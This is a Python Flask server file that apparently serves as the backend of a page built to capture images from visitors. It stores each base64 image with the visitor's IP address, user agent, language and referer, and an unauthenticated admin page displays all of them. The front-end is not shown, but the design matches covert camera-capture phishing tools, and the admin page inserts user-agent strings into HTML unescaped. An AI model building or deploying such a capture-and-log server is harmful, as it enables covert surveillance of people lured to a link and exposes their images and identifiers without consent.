import os
import base64
import json
import time
from datetime import datetime
from flask import Flask, request, send_from_directory, jsonify

app = Flask(__name__, static_folder='static')

CAPTURE_DIR = 'captures'
os.makedirs(CAPTURE_DIR, exist_ok=True)

LOG_FILE = os.path.join(CAPTURE_DIR, 'log.jsonl')


@app.route('/')
def index():
    return send_from_directory('static', 'index.html')


@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)


@app.route('/api/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json(force=True)
    except Exception as e:
        return jsonify({'status': 'error', 'msg': f'bad json: {e}'}), 400

    image_b64 = data.get('image', '')
    if not image_b64:
        return jsonify({'status': 'error', 'msg': 'no image'}), 400

    if ',' in image_b64:
        image_b64 = image_b64.split(',', 1)[1]

    try:
        image_bytes = base64.b64decode(image_b64)
    except Exception as e:
        return jsonify({'status': 'error', 'msg': f'decode fail: {e}'}), 400

    if len(image_bytes) > 15 * 1024 * 1024:
        return jsonify({'status': 'error', 'msg': 'too large'}), 413

    ts = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'unknown')
    if ',' in ip:
        ip = ip.split(',')[0].strip()

    ua = request.headers.get('User-Agent', 'unknown')
    lang = request.headers.get('Accept-Language', 'unknown')

    safe_ip = ip.replace('.', '_').replace(':', '_')
    fname = f'{ts}_{safe_ip}.jpg'
    fpath = os.path.join(CAPTURE_DIR, fname)

    with open(fpath, 'wb') as f:
        f.write(image_bytes)

    entry = {
        'ts': time.time(),
        'datetime': datetime.now().isoformat(),
        'ip': ip,
        'ua': ua,
        'lang': lang,
        'referer': request.headers.get('Referer', ''),
        'image_file': fname,
        'image_size': len(image_bytes),
        'extra': data.get('meta', {}),
    }

    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(entry, ensure_ascii=False) + '\n')

    print(f'[+] captured {ip} {fname} ({len(image_bytes)} bytes)')
    return jsonify({'status': 'ok', 'file': fname}), 200


@app.route('/admin')
def admin():
    entries = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    entries.append(json.loads(line))
                except Exception:
                    pass
    entries.reverse()

    html = ['<!doctype html><html><head><meta charset="utf-8">',
            '<meta name="viewport" content="width=device-width,initial-scale=1">',
            '<title>Captures</title>',
            '<style>body{font-family:monospace;background:#111;color:#eee;padding:12px;font-size:13px}',
            '.e{border:1px solid #333;padding:10px;margin:10px 0;border-radius:6px}',
            'img{max-width:100%;border-radius:4px;margin-top:8px}',
            '.k{color:#7cf} .v{color:#fc7;word-break:break-all}</style></head><body>',
            f'<h1>Captures ({len(entries)})</h1>']

    for e in entries:
        html.append('<div class="e">')
        html.append(f'<div><span class="k">time:</span> <span class="v">{e.get("datetime","")}</span></div>')
        html.append(f'<div><span class="k">ip:</span> <span class="v">{e.get("ip","")}</span></div>')
        html.append(f'<div><span class="k">ua:</span> <span class="v">{e.get("ua","")[:200]}</span></div>')
        html.append(f'<div><span class="k">lang:</span> <span class="v">{e.get("lang","")}</span></div>')
        img = e.get('image_file', '')
        if img:
            html.append(f'<img src="/captures/{img}">')
        html.append('</div>')

    html.append('</body></html>')
    return '\n'.join(html)


@app.route('/captures/<path:filename>')
def captures(filename):
    return send_from_directory(CAPTURE_DIR, filename)


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
